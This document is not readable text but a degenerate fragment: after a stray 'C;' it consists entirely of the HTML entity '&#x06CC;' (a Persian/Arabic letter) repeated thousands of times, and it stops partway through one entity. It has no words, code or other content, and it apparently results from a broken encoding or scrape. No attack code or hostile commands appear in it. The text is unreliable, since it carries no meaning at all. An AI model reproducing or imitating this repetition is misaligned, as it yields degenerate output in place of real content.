C;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06CC;&#x06